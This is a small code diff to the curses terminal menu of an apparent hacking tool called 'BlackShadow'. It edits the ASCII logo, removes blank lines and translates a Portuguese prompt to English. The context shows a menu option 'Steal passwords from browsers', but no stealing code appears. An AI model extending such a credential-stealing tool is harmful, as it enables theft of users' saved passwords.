@@ -37,7 +37,7 @@ def showLogo(screen):
     ⠀⠀⣰⣿⣿⣇⣸⣿⣇⣸⣿       / __ )/ /___ ______/ /__/ ___// /_  ____ _____/ /_____      __
     ⠀⣴⣿⣿⣿⣿⠟⢻⣿⣿⣿      / __  / / __ `/ ___/ //_/\__ \/ __ \/ __ `/ __  / __ \ | /| / /
    ⣠⣾⣿⣿⣿⣿⣿⣤⣼⣿⣿⡇     / /_/ / / /_/ / /__/ , < ___/ / / / / /_/ / /_/ / /_/ / |/ |/ / 
-   ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,_/\___/_/|_|/____/_/ /_/\__,_/\__,_/\____/|__/|__/  
+   ⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠀    /_____/_/\__,__\___/_/|_|/____/_/ /_/\__,__\__,_/\____/|__/|__/  
    ⠀⠀⠀⠈⠿⠿⠋⠙⠿⠛⠁
     """
     screen.addstr(logo)
@@ -60,7 +60,6 @@ def displayMenu(screen, options, currentOption, title):
         else:
             screen.addstr(displayIdx, 5, f"  {description}")
     screen.refresh()
-
 def handleInput(key, currentOption, options):
     if key == curses.KEY_UP:
         currentOption = (currentOption - 1) % len(options)
@@ -71,7 +70,6 @@ def handleInput(key, currentOption, options):
     elif key == 27:
         return '0', currentOption
     return None, currentOption
-
 def mainMenuControl():
     options = [
         ("1", "Steal passwords from browsers"),
@@ -137,7 +135,7 @@ def main():
                 else:
                     print(f"{RED}Opção inválida!{RESET}")
 
-                input("Pressione Enter para continuar...")
+                input("Press Enter to continue...")
                 os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '0':
             exit()
